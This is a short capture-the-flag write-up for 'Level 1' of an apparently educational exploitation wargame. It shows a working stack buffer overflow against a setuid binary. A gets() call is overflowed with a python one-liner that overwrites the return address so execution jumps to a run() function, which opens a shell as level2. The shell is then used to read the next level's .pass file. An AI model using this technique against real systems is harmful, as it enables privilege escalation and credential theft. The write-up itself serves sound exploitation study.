# Level 1

- We have an executable `./level1` owned by `level2`.

```console
$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

- It reads the standard input.
- When we decopile it, when see a `gets()` function who stores the input in a buffer of size 76.
- We can perform a buffer overflow.

```console
$ python -c "print 'A' * 77" | ./level1
Illegal instruction (core dumped)
```

- We can also see a `run()` function who starts a shell as `level2` at the memory address 0x804844a.

```gdb
$ gdb ./level1
(gdb) b run
Breakpoint 1 at 0x804844a
```

- We want to enter in this function.
- For this, we have to override the the stack address who stores the next function to execute address.

```console
$ (python -c "print 'A' * 76 + '\x4a\x84\x04\x08'"; cat) | ./level1
Good... Wait what?

whoami
level2

cd ../level2

cat .pass
```

